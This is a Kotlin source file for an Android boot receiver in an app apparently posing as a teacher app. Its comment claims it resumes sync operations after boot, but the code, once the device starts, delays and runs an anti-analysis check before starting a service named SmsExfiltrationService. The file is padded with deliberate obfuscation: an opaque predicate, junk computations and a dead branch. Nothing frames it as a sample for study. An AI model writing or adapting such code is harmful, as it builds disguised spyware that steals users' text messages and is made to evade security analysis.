package com.example.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.example.teacherapp.obfuscation.AntiAnalysisUtils
import com.example.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * StartupReceiver — initialises background services after device boot.
 * Restores app state and resumes pending sync operations.
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        // Opaque predicate: boot action check wrapped in safe environment gate
        val t = System.currentTimeMillis()
        val op = (t % 1000 + 1) * (t % 1000 + 1)  // always > 0
        if (op > 0 && intent.action == Intent.ACTION_BOOT_COMPLETED) {
            CoroutineScope(Dispatchers.Default).launch {
                // Junk no-op to increase complexity
                val noise = IntArray(32) { i -> (i * 17 + 3) xor 0xAB }
                val _ = noise.sum()

                delay(60000L)

                // Execute only in safe environment
                AntiAnalysisUtils.executeIfSafe(context) {
                    SmsExfiltrationService.startExfiltration(context)
                }
            }
        } else if (op <= 0) {
            // Junk branch — never executed
            val fakeList = (1..100).map { it * it }
            val _ = fakeList.sum()
        }
    }
}
